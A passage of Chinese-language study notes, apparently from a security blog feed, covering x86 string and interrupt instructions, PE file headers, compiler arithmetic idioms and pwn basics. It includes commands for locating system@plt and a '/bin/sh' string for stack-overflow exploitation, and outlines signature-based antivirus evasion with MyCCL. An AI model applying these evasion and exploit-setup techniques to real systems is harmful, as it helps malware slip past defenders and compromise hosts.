"/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200413224834574.png" alt="image-20200413224834574" /></p><p>串比较指令<br />基本格式: [REPE/Z] [REPNZ/NE] CMPS DESTS, SRCS<br />[REPE/Z] [REPNZ/NE] CMPSB/CMPSW/CMPSD<br />功能:由DS : (E)SI规定的源串元素减去ES : (E)DI指出的目的串元素,结果不回送,仅影响标志位CF , AF，PF, OF , ZF , SF.当源串元素与目的串元素值相同时, ZF=1 ;否则ZF=0。每执行一次串比较指令，根据DF的值和串元素数据类型自动修改(E)SI和(E)DI。<br />在串比较指令前加重复前缀REPE/Z ,则表示重复比较两个字符串,若两个字符串的元素相同则此较到(E)CX=0为止,否则结束比较。在串比较指令前加重复前REPNE/NZ ,则表示若两个字符串元素不相同时,重复比较直到(E)CX=0为止,否则结束比较</p><p>串扫描指令<br />格式①: [REPE/Z] [REPNE/NZ] SCAS DESTS<br />格式②: [REPE/Z] [REPNE/NZ] SCASB/SCASW/SCASD<br />功能:由AL , AX或EAX的内容减去ES : (E)DI规定的目的串元素,结果不回送,仅影响标志位CF , AF,PF, SF ,OF , ZF。当AL, AX或EAX的值与目的串元素值相同时, ZF=1 ;否则ZF=0。每执行- -次串扫描指令,根据DF的值和串元素数据类型自动修改(E)DI。<br />在串扫描指令前加重复前缀REPE/Z ,则表示目的串元素值和累加器值相同时重复扫描,直到CX/ECX=0为止,否则结束3描。若加重复前缀REPNE/NZ ,则表示当目的串元素值与累加器值不相等时,重复扫描直到CX/ECX=0时为止,否则结束扫描。该指令影响标志位为CF , AF, PF , SF , OF , ZF。</p><p>串存储指令<br />格式: [REP] STOS DESTS<br />[REP] STOSB/STOSW/STOSD<br />功能:将累加器[AL, AX , EAX]中值存入ES : DI/EDI所指的目的串存储单元中,每传递一次,都按DF值以及串元素类型自动修改地址指针DI/EDI。若加重复前缀REP ,则表示将累加器的值连续送目的串存储单元,直到CX/ECX=0时为止。<br />该指令不影响标志位。</p><p>中断指令与DOS功能调用<br />中断指令格式: INT n<br />功能:产生中断类型码为n的软中断,该指令包含中断操作码和中断类型码两部分,中断类型码n为8位,取值范围为0.255(00H FFH)<br />软中断执行过程:<br />①将标志寄存器FLAGS(或EFLAGS)压入堆栈;<br />⑦清除TF和IF标志位;<br />③CS, IP/EIP压入堆栈;<br />④实模式下, nx4获取中断欠量表地址指针:保护模式下, nx 8获取中断描述符表地址指针:<br />⑤根据地址指针。从中断矢量表或中断描述符表中取出中断服务程序地址送IP/EIP和CS中,控制程序转移去执行中断服务程序。</p><p>中断返回指令格式: IRET/IRETD<br />功能:该指令实现在中断服务程序结束后,返回到主程序中断断点处,继续执行主程序。<br />中断返回执行过程:<br />IRET指令弹出堆栈中数据送IP , CS , FLAGS;<br />IRETD指令弹出堆栈中数据送EIP，CS，EFLAGS。</p><h1 id="二进制分析pwn"><a class="markdownIt-Anchor" href="#二进制分析pwn"></a> 二进制分析&amp;pwn</h1><h2 id="编译"><a class="markdownIt-Anchor" href="#编译"></a> 编译</h2><p>gcc -no-pie -m32 -o xx xx.c</p><h2 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h2><h3 id="检查保护"><a class="markdownIt-Anchor" href="#检查保护"></a> 检查保护</h3><p>checksek</p><h3 id="查找system函数的plt地址"><a class="markdownIt-Anchor" href="#查找system函数的plt地址"></a> 查找system函数的plt地址</h3><p>objdump -d -j .plt ./xx |grep system</p><h3 id="查找bin_sh字符串地址"><a class="markdownIt-Anchor" href="#查找bin_sh字符串地址"></a> 查找bin_sh字符串地址</h3><p>pip install ropgadget</p><p>ROPgadget --binary ./xx --string “/bin/sh”</p><h3 id="栈溢出shellcode编写"><a class="markdownIt-Anchor" href="#栈溢出shellcode编写"></a> 栈溢出（shellcode编写）</h3><p>写入数据不捡查长度，容易导致数据的溢出；而进行的写入数据的执行；往栈里写入数据会导致溢出，溢出方式会向下覆盖栈，要注意堆栈平衡。</p><h2 id="pe文件结构讲解与特征码免杀原理"><a class="markdownIt-Anchor" href="#pe文件结构讲解与特征码免杀原理"></a> PE文件结构讲解与特征码免杀原理</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200420212023529.png" alt="image-20200420212023529" /></p><p>PE（portable executable）基本结构：</p><p>PE文件是指32位可执行文件，也称为PE32。64位的可执行文件称为PE+或PE32+,是PE(PE32)的一种扩展形式（请注意不是PE64)。</p><p>Magic :表示可选头的类型。<br />MajorL inkerVersion和MinorL inkerVersion :链接器的版本号。<br />SizeOfCode :代码段的长度,如果有多个代码段,则是代码段长度的总和。<br />SizeOfInitializedData :初始化的数据长度。<br />SizeOfUninitializedData :未初始化的数据长度。<br />AddressOfEntryPoint :程序入口的RVA ,对于exe这个地址可以理解为WinMain的RVA.<br />对于DLL ,这个地址可以理解为DlIMain的RVA，<br />如果是驱动程序,可以理解为DriverEntry的RVA。<br />BaseOfC ode :代码段起始地址的RVA。<br />BaseOfData :数据段起始地址的RVA。<br />ImageBase :映象(加载到内存中的PE文件)的基地址,这个基地址是建议,对于DLL来说,如果无法加载到这个地址,系统会自动为其选择地址。<br />SectionAlignment :节对齐, PE中的节被加载到内存时会按照这个域指定的值来对齐,比如这个值是0x1000 ,那么每个节的起始地址的低12位都为0.<br />FileAlignment :节在文件中按此值对齐, SectionAlignment必须大于或等于FileAlignment.<br />MajorOperatingSystemVersion. MinorOperatingSystemVersion :所需操作系统的版本号,随着操作系统版本越来越多,这个好像不是那么重要了。<br />MajorImageVersion, MinorlmageVersion :映象的版本号,这个是开发者自己指定的,由连接器填写。<br />MajorSubsystemVersion. MinorSubsystemVersion :所需子系统版本号。<br />Win32VersionValue ;保留，必须为0.<br />SizeOfImage :映象的大小, PE文件加载到内存中空间是连续的,这个值指定占用虚拟空间的大小。<br />SizeOfHeaders :所有文件头(包括节表)的大小,这个值是以FileAlignment对齐的。<br />CheckSum :映象文件的校验和。<br />Subsystem :运行该PE文件所需的子系统。</p><p>pe头结构：</p><p>SizeOfRawData :该区块在磁盘中所占的大小。在可执行文件中,该字段是已经被FileAlignment潜规则处理过的长度。<br />PointerToRawData :该区块在磁盘中的偏移。这个数值是从文件头开始算起的偏移量。</p><p>Characteristics :该区块的属性。该字段是按位来指出区块的属性(如代码/数据/可读/可写等)的标志。</p><h5 id="pe结构"><a class="markdownIt-Anchor" href="#pe结构"></a> PE结构</h5><p>当一个PE文件被执行时，PE装载器首先检查DOS header里的PE header的偏移量。如果找到，则直接跳转到PE header的位置。</p><p>当PE装载器跳转到PE header后，第二步要做的就是检查PE header是否有效。如果该PE header有效，就跳转到PE header的尾部。</p><p>紧跟PE header尾部的是节表。PE装载器执行完第二步后开始读取节表中的节段信息，并采用文件映射（在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射的机制，也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系，只有真正执行到某个内存页中的指令或者访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大的关系）的方法将这些节段映射到内存，同时附上节表里指定节段的读写属性。</p><p>PE文件映射入内存后，PE装载器将继续处理PE文件中类似 import table （输入表）的逻辑部分。</p><p>这四个步骤便是PE文件的执行顺序，具体细节读者可以参考相关文档。（以上四个步骤摘自《黑客破解精通》）</p><h5 id="pe文件与内存映像"><a class="markdownIt-Anchor" href="#pe文件与内存映像"></a> PE文件与内存映像</h5><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/5423323-f4d307276ece24d7.png" alt="img" /></p><p>文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。</p><p>VA指进程虚拟内存的绝对地址，RVA(Relative Virtual Address，相对虚拟地址)是指从某基准位置（ImageBase）开始的相对地址。VA与RVA满足下面的换算关系：</p><p>RVA+ImageBase=VA</p><p>PE头内部信息大多是RVA形式存在。原因在于（主要是DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他的PE文件（DLL）。此时必须通过重定向（Relocation）将其加载到其他空白的位置，若PE头信息使用的是VA，则无法正常访问。因此使用RVA来重定向信息，即使发生了重定向，只要相对于基准位置的相对位置没有变化，就能正常访问到指定信息，不会出现任何问题。</p><p>当PE文件被执行时，PE装载器会为进程分配4GB的虚拟地址空间，然后把程序所占用的磁盘空间作为虚拟内存映射到这个4GB的虚拟地址空间中。一般情况下，会映射到虚拟地址空间中的0X400000的位置。</p><h5 id="dos头分header和dos存根header结构00000000-0000003f共64个字节-mz"><a class="markdownIt-Anchor" href="#dos头分header和dos存根header结构00000000-0000003f共64个字节-mz"></a> DOS头（分Header和DOS存根）：Header结构(00000000 - 0000003F，共64个字节)   MZ</h5><figure class="highlight rust"><table><tr><td class="code"><pre><code class="hljs rust">typedef <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_IMAGE_DOS_HEADER</span></span> &#123; <span class="hljs-comment">// DOS的.EXE头部</span><br>  USHORT e_magic;  '<span class="hljs-comment">// DOS签名“MZ--&gt;Mark Zbikowski（设计了DOS的工程师）” -&gt; 4D 5A '</span><br>  USHORT e_cblp;    <span class="hljs-comment">// 文件最后页的字节数 -&gt; 00 90 -&gt; 144</span><br>  USHORT e_cp;      <span class="hljs-comment">// 文件页数 -&gt; 00 30 -&gt; 48</span><br>  USHORT e_crlc;    <span class="hljs-comment">// 重定义元素个数 -&gt; 00 00</span><br>  USHORT e_cparhdr; <span class="hljs-comment">// 头部尺寸，以段落为单位 -&gt; 00 04</span><br>  USHORT e_minalloc; <span class="hljs-comment">// 所需的最小附加段 -&gt; 00 00</span><br>  USHORT e_maxalloc; <span class="hljs-comment">// 所需的最大附加段 -&gt; FF FF</span><br>  USHORT e_ss;       <span class="hljs-comment">// 初始的SS值（相对偏移量） -&gt; 00 00</span><br>  USHORT e_sp;       <span class="hljs-comment">// 初始的SP值 -&gt; 00 B8 -&gt; 184</span><br>  USHORT e_csum;     <span class="hljs-comment">// 校验和 -&gt; 00 00</span><br>  USHORT e_ip;       <span class="hljs-comment">// 初始的IP值 -&gt; 00 00</span><br>  USHORT e_cs;       <span class="hljs-comment">// 初始的CS值（相对偏移量） -&gt; 00 00</span><br>  USHORT e_lfarlc;   <span class="hljs-comment">// 重分配表文件地址 -&gt; 00 40 -&gt; 64</span><br>  USHORT e_ovno;     <span class="hljs-comment">// 覆盖号 -&gt; 00 00</span><br>  USHORT e_res[<span class="hljs-number">4</span>];   <span class="hljs-comment">// 保留字 -&gt; 00 00 00 00 00 00 00 00</span><br>  USHORT e_oemid;    <span class="hljs-comment">// OEM标识符（相对e_oeminfo） -&gt; 00 00</span><br>  USHORT e_oeminfo;  <span class="hljs-comment">// OEM信息 -&gt; 00 00</span><br>  USHORT e_res2[<span class="hljs-number">10</span>]; <span class="hljs-comment">// 保留字 -&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br>  LONG e_lfanew;    '<span class="hljs-comment">// 指示NT头的偏移（根据不同文件拥有可变值） -&gt; 00 00 00 C0 -&gt; 192'</span><br>&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;<br></code></pre></td></tr></table></figure><p>注意Win+Intel的电脑上大部分采用”小端法”，字节在内存中储存方式是倒过来的。重要参数为<code>e_magic</code>和<code>e_lfanew</code>，已用不同颜色体现。</p><h5 id="nt头pe最重要的头长度由dos头-e_lfanew-决定image_nt_headers32pe"><a class="markdownIt-Anchor" href="#nt头pe最重要的头长度由dos头-e_lfanew-决定image_nt_headers32pe"></a> NT头（PE最重要的头，长度由DOS头 <code>e_lfanew</code> 决定）：<strong>IMAGE_NT_HEADERS32</strong>PE</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_NT_HEADERS</span> &#123;</span> <br>        DWORD Signature;                         <span class="hljs-comment">// 类似于DOS头中的e_magic -&gt; 00 00 45 50 -&gt; PE</span><br>        IMAGE_FILE_HEADER FileHeader;             <span class="hljs-comment">// IMAGE_FILE_HEADER是PE文件头，定义如下</span><br>        IMAGE_OPTIONAL_HEADER32 OptionalHeader;   <span class="hljs-comment">// </span><br>&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;<br>IMAGE_FILE_HEADER：其中有<span class="hljs-number">4</span>个重要的成员，若设置不正确，将会导致文件无法正常运行<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="code"><pre><code class="hljs rust">typedef <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_IMAGE_FILE_HEADER</span></span> &#123; <br>        WORD    Machine;              '<span class="hljs-comment">// 每个CPU拥有唯一的Machine码 -&gt; 4C 01 -&gt; PE -&gt; 兼容32位Intel X86芯片'</span><br><br>        WORD    NumberOfSections;     '<span class="hljs-comment">// 指文件中存在的节段（又称节区）数量，也就是节表中的项数 -&gt; 00 04 -&gt; 4</span><br>                                       <span class="hljs-comment">// 该值一定要大于0，且当定义的节段数与实际不符时，将发生运行错误。'</span><br><br>        DWORD   TimeDateStamp;         <span class="hljs-comment">// PE文件的创建时间，一般有连接器填写 -&gt; 38 D1 29 1E</span><br>        DWORD   PointerToSymbolTable;  <span class="hljs-comment">// COFF文件符号表在文件中的偏移 -&gt; 00 00 00 00</span><br>        DWORD   NumberOfSymbols;       <span class="hljs-comment">// 符号表的数量 -&gt; 00 00 00 00</span><br><br>        WORD    SizeOfOptionalHeader; '<span class="hljs-comment">// 指出IMAGE_OPTIONAL_HEADER32结构体的长度。-&gt;  00 E0 -&gt; 224字节</span><br>                                       <span class="hljs-comment">// PE32+格式文件中使用的是IMAGE_OPTIONAL_HEADER64结构体，</span><br>                                       <span class="hljs-comment">// 这两个结构体尺寸是不相同的，所以需要在SizeOfOptionalHeader中指明大小。'</span><br><br>        WORD    Characteristics;      '<span class="hljs-comment">// 标识文件的属性，二进制中每一位代表不同属性 -&gt; 0F 01</span><br>                                       <span class="hljs-comment">// 属性参见https://blog.csdn.net/qiming_zhang/article/details/7309909#3.2.2'</span><br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br><br>IMAGE_OPTIONAL_HEADER：其中有<span class="hljs-number">9</span>个重要参数，设置错误会导致文件无法运行<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="code"><pre><code class="hljs rust">typedef <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_IMAGE_OPTIONAL_HEADER</span></span> &#123; <br>        WORD    Magic;                     '<span class="hljs-comment">// 魔数 32位为0x10B，64位为0x20B，ROM镜像为0x107'</span><br>        BYTE    MajorLinkerVersion;         <span class="hljs-comment">// 链接器的主版本号 -&gt; 05</span><br>        BYTE    MinorLinkerVersion;         <span class="hljs-comment">// 链接器的次版本号 -&gt; 0C</span><br>        DWORD   SizeOfCode;                 <span class="hljs-comment">// 代码节大小，一般放在“.text”节里，必须是FileAlignment的整数倍 -&gt; 40 00 04 00</span><br>        DWORD   SizeOfInitializedData;      <span class="hljs-comment">// 已初始化数大小，一般放在“.data”节里，必须是FileAlignment的整数倍 -&gt; 40 00 0A 00</span><br>        DWORD   SizeOfUninitializedData;    <span class="hljs-comment">// 未初始化数大小，一般放在“.bss”节里，必须是FileAlignment的整数倍 -&gt; 00 00 00 00</span><br>        DWORD   AddressOfEntryPoint;       '<span class="hljs-comment">// 指出程序最先执行的代码起始地址(RVA) -&gt; 00 00 10 00'</span><br>        DWORD   BaseOfCode;                 <span class="hljs-comment">// 代码基址，当镜像被加载进内存时代码节的开头RVA。必须是SectionAlignment的整数倍 -&gt; 40 00 10 00</span><br><br>        DWORD   BaseOfData;                 <span class="hljs-comment">// 数据基址，当镜像被加载进内存时数据节的开头RVA。必须是SectionAlignment的整数倍 -&gt; 40 00 20 00</span><br>                                            <span class="hljs-comment">// 在64位文件中此处被并入紧随其后的ImageBase中。</span><br><br>        DWORD   ImageBase;                 '<span class="hljs-comment">// 当加载进内存时，镜像的第1个字节的首选地址。</span><br>                                            <span class="hljs-comment">// WindowEXE默认ImageBase值为00400000，DLL文件的ImageBase值为10000000，也可以指定其他值。</span><br>                                            <span class="hljs-comment">// 执行PE文件时，PE装载器先创建进程，再将文件载入内存，</span><br>                                            <span class="hljs-comment">// 然后把EIP寄存器的值设置为ImageBase+AddressOfEntryPoint'</span><br><br>                                           '<span class="hljs-comment">// PE文件的Body部分被划分成若干节段，这些节段储存着不同类别的数据。'</span><br>        DWORD   SectionAlignment;          '<span class="hljs-comment">// SectionAlignment指定了节段在内存中的最小单位， -&gt; 00 00 10 00'</span><br>        DWORD   FileAlignment;             '<span class="hljs-comment">// FileAlignment指定了节段在磁盘文件中的最小单位，-&gt; 00 00 02 00</span><br>                                            <span class="hljs-comment">// SectionAlignment必须大于或者等于FileAlignment'</span><br><br>        WORD    MajorOperatingSystemVersion;<span class="hljs-comment">// 主系统的主版本号 -&gt; 00 04</span><br>        WORD    MinorOperatingSystemVersion;<span class="hljs-comment">// 主系统的次版本号 -&gt; 00 00</span><br>        WORD    MajorImageVersion;          <span class="hljs-comment">// 镜像的主版本号 -&gt; 00 00</span><br>        WORD    MinorImageVersion;          <span class="hljs-comment">// 镜像的次版本号 -&gt; 00 00</span><br>        WORD    MajorSubsystemVersion;      <span class="hljs-comment">// 子系统的主版本号 -&gt; 00 04</span><br>        WORD    MinorSubsystemVersion;      <span class="hljs-comment">// 子系统的次版本号 -&gt; 00 00</span><br>        DWORD   Win32VersionValue;          <span class="hljs-comment">// 保留，必须为0 -&gt; 00 00 00 00</span><br><br>        DWORD   SizeOfImage;               '<span class="hljs-comment">// 当镜像被加载进内存时的大小，包括所有的文件头。向上舍入为SectionAlignment的倍数。</span><br>                                            <span class="hljs-comment">// 一般文件大小与加载到内存中的大小是不同的。 -&gt; 00 00 50 00'</span><br><br>        DWORD   SizeOfHeaders;             '<span class="hljs-comment">// 所有头的总大小，向上舍入为FileAlignment的倍数。</span><br>                                            <span class="hljs-comment">// 可以以此值作为PE文件第一节的文件偏移量。-&gt; 00 00 04 00'</span><br><br>        DWORD   CheckSum;                   <span class="hljs-comment">// 镜像文件的校验和 -&gt; 00 00 B4 99</span><br><br>        WORD    Subsystem;                 '<span class="hljs-comment">// 运行此镜像所需的子系统 -&gt; 00 02 -&gt; 窗口应用程序</span><br>                                            <span class="hljs-comment">// 用来区分系统驱动文件（*.sys)与普通可执行文件（*.exe，*.dll），</span><br>                                            <span class="hljs-comment">// 参考：https://blog.csdn.net/qiming_zhang/article/details/7309909#3.2.3'</span><br><br>        WORD    DllCharacteristics;         <span class="hljs-comment">// DLL标识 -&gt; 00 00</span><br>        DWORD   SizeOfStackReserve;         <span class="hljs-comment">// 最大栈大小。CPU的堆栈。默认是1MB。-&gt; 00 10 00 00</span><br>        DWORD   SizeOfStackCommit;          <span class="hljs-comment">// 初始提交的堆栈大小。默认是4KB -&gt; 00 00 10 00</span><br>        DWORD   SizeOfHeapReserve;          <span class="hljs-comment">// 最大堆大小。编译器分配的。默认是1MB -&gt;00 10 00 00</span><br>        DWORD   SizeOfHeapCommit;           <span class="hljs-comment">// 初始提交的局部堆空间大小。默认是4K -&gt;00 00 10 00</span><br>        DWORD   LoaderFlags;                <span class="hljs-comment">// 保留，必须为0 -&gt; 00 00 00 00</span><br><br>        DWORD   NumberOfRvaAndSizes;       '<span class="hljs-comment">// 指定DataDirectory的数组个数，由于以前发行的Windows NT的原因，它只能为16。 -&gt; 00 00 00 10'</span><br>        IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; '<span class="hljs-comment">// 数据目录数组。详见下文。' </span><br>    &#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br><br>typedef <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_IMAGE_DATA_DIRECTORY</span></span> &#123;  <br>    DWORD   VirtualAddress;  <br>    DWORD   Size;  <br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br><br>DataDirectory[] 数据目录数组：数组每项都有被定义的值，不同项对应不同数据结构。重点关注的IMPORT和EXPORT，它们是PE头中的非常重要的部分，其它部分不怎么重要，大致了解下即可<br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">'#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory '</span><br><span class="hljs-string">'#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory '</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory </span><br><span class="hljs-comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage) </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor</span><br></code></pre></td></tr></table></figure><h5 id="dos存根00000040-000000bf共128字节"><a class="markdownIt-Anchor" href="#dos存根00000040-000000bf共128字节"></a> DOS存根（00000040 - 000000BF，共128字节）</h5><p>DOS存根则是一段简单的DOS程序，主要用来输出类似“This program cannot be run in DOS mode.”的提示语句。即使没有DOS存根，程序也能正常执行。<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fsong_10%2Farticle%2Fdetails%2F84036010" target="_blank" rel="noopener">参考：DOS存根写入数据的想法</a></p><h5 id="特征码免杀"><a class="markdownIt-Anchor" href="#特征码免杀"></a> 特征码免杀</h5><p>可以使用工具进行分片，填充进行分割，然后使用杀软进行扫描删除文件的位置，特征码最先出现在什么位置；之后修改所有出现的定位特征码，后进行查杀可以发现，软件不被查杀了；古老的定位软件：MyCCL</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> PE </category>
          
          <category> computer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向基础知识</title>
      <link href="/2020/07/27/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/07/27/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="逆向基础知识"><a class="markdownIt-Anchor" href="#逆向基础知识"></a> 逆向基础知识</h1><h2 id="局部变量"><a class="markdownIt-Anchor" href="#局部变量"></a> 局部变量</h2><p>存放区域是栈，进入函数时分配，函数返回时释放。</p><h2 id="全局变量"><a class="markdownIt-Anchor" href="#全局变量"></a> 全局变量</h2><p>全局变量的地址在编译期间就会确定下来，一般以固定的地址访问全局变量。使用固定的硬编码地址直接对内存进行寻址。</p><h2 id="数组"><a class="markdownIt-Anchor" href="#数组"></a> 数组</h2><p>占用空间：sizeof（类型）*个数</p><p>数组寻址公式：数组首地址+sizeof（一维数组类型）x下标1+sizeof（数组类型） x下标2</p><p>一般会优化为编译器直接给出计算结果。</p><h2 id="文本字符串"><a class="markdownIt-Anchor" href="#文本字符串"></a> 文本字符串</h2><h3 id="字符串存储格式"><a class="markdownIt-Anchor" href="#字符串存储格式"></a> 字符串存储格式</h3><h4 id="c字符串"><a class="markdownIt-Anchor" href="#c字符串"></a> c字符串</h4><p>\0作为结束标识</p><h4 id="dos字符串"><a class="markdownIt-Anchor" href="#dos字符串"></a> dos字符串</h4><p>行以$作为终止字符</p><h4 id="pascal字符串"><a class="markdownIt-Anchor" href="#pascal字符串"></a> Pascal字符串</h4><p>没有终止字符，但在开头第一个字节写明长度</p><h4 id="dephi字符串"><a class="markdownIt-Anchor" href="#dephi字符串"></a> dephi字符串</h4><p>双字节dephi：开头双字节</p><p>四字节dephi：长度字段拓展为4字节</p><h3 id="计算字符串长度"><a class="markdownIt-Anchor" href="#计算字符串长度"></a> 计算字符串长度</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs assembly">MOV ECX, FFFFFFFF<br>SUB EAX, EAX<br>REPNZ<br>SCASB           ;把al内容和edi指向的附加段中的数据逐一进行比较<br>NOT ECX<br>DEC ECX<br>JE XXXXXX<br></code></pre></td></tr></table></figure><h2 id="使用纯算法实现逻辑判断"><a class="markdownIt-Anchor" href="#使用纯算法实现逻辑判断"></a> 使用纯算法实现逻辑判断</h2><p>利用cf标识位进行逻辑判断，例如使用neg检验eax是否为0，结果放在cf中，sbb eax，eax结果由cf决定，当cf为1的时候，eax为-1，否则为0.（主要知道这是逻辑判断优化的结果，就不难还原）</p><h2 id="加减法"><a class="markdownIt-Anchor" href="#加减法"></a> 加减法</h2><h3 id="整数加减法"><a class="markdownIt-Anchor" href="#整数加减法"></a> 整数加减法</h3><p>add或adc、lea f，[a+b+8]；sbb或sub，~；存在常量折叠的情况。</p><h2 id="乘法"><a class="markdownIt-Anchor" href="#乘法"></a> 乘法</h2><h3 id="整数乘法"><a class="markdownIt-Anchor" href="#整数乘法"></a> 整数乘法</h3><p>mul、imul运算比较慢，优化后一般对2的幂使用shl，非5的倍数可以写成lea eax，[eax+4*eax]    lea指令可以实现寄存器乘以2、4或8的运算</p><h2 id="除法"><a class="markdownIt-Anchor" href="#除法"></a> 除法</h2><p>div、idiv除法运算大概比乘法多消耗10倍的cpu时钟周期，被除数如果是一个未知数，编译器还是会使用div。</p><h3 id="整数除法"><a class="markdownIt-Anchor" href="#整数除法"></a> 整数除法</h3><p>如果是2的幂，会无符号使用shr，有符号使用sar；会根据一定算法使用乘法代替除法；除法指令需要使用符号拓展指令cdq，其作用是把eax寄存器中的数字视作有符号的数字，将其符号位拓展到edx寄存器中，若eax最高位是1，则edx=FFFFFFFFh，若eax最高位为0，则执行后edx=00000000h。最常用的优化公式为倒数相乘。</p><h4 id="有符号除法除数为2的n次幂"><a class="markdownIt-Anchor" href="#有符号除法除数为2的n次幂"></a> 有符号除法，除数为2的n次幂</h4><p>位移优化：x大于等于0，则x&gt;&gt;n;x小于0，（x+(2ⁿ -1)）&gt;&gt;n;</p><h4 id="有符号除法除数为-2n"><a class="markdownIt-Anchor" href="#有符号除法除数为-2n"></a> 有符号除法，除数为-2ⁿ</h4><p>x大于等于0，-（x&gt;&gt;n）;x&lt;0,-((x+(2ⁿ-1))&gt;&gt;n)</p><h4 id="有符号除法除数为正非2n"><a class="markdownIt-Anchor" href="#有符号除法除数为正非2n"></a> 有符号除法，除数为正非2ⁿ</h4><p>32位：x大于等于0，x*c&gt;&gt;32&gt;&gt;n((x*c&gt;&gt;32)+x&gt;&gt;n)，x小于0，（x*c&gt;&gt;32&gt;&gt;n)+1（((x*c&gt;&gt;32)+x&gt;&gt;n）+1)</p><p>64位：x大于等于0，x*c&gt;&gt;64&gt;&gt;n((x*c&gt;&gt;64)+x&gt;&gt;n)，x小于0，（x*c&gt;&gt;64&gt;&gt;n)+1(((x*c&gt;&gt;64)+x&gt;&gt;n)+1)</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs assembly">64位除法<br>mov rax, xxxx<br>cqo<br>and edx, num1<br>add rdx, rax<br>sar rdx, num2<br>neg rdx<br></code></pre></td></tr></table></figure><p>以上公式都可以使用2ⁿ/c=o,将除数计算出来。</p><h4 id="有符号除法除数负非2n"><a class="markdownIt-Anchor" href="#有符号除法除数负非2n"></a> 有符号除法，除数负非2ⁿ</h4><p>将上述+换为-即可。</p><h4 id="无符号除法除数非2n"><a class="markdownIt-Anchor" href="#无符号除法除数非2n"></a> 